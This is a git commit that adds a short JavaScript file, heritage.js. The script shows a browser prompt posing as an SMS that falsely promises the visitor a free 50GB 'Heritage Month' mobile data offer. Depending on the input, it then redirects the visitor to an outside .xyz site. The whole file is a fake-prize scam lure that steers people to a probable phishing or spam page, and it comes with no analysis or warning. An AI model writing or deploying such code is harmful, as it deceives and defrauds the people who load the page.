3b723e2754254fbfed2d91b7306bb05b6bce1f51
newetijazz1 <newetijazz1@gmail.com>
2025-09-06 14:05:08 +0100

    Create heritage.js

---
+++ heritage.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations, your Mobile number is eligible to receive 50gb Heritage Month celebration offer, Press Ok to activate Now ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://www.isadata.xyz/Heritage-50gb';
+}
